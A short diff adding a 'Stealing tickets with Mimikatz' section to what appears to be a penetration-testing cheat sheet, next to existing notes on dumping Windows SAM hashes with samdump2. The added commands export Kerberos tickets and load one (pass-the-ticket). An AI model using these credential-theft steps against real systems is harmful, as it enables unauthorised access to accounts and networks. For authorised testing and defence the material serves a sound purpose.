@@ -111,6 +111,18 @@ cd /mnt/mountpoint/Windows/system32/config
 samdump2 SYSTEM SAM
 ```
 
+# Stealing tickets with Mimikatz
+Tickets will be written to file system
+```batch
+mimikatz# kerberos::list /export
+```
+Loading a ticket
+```batch
+mimikatz# kerberos::ptt <ticket-file>
+mimikatz# kerberos::list
+
+```
+
 ## Cheat Sheets
 Mother Script
 
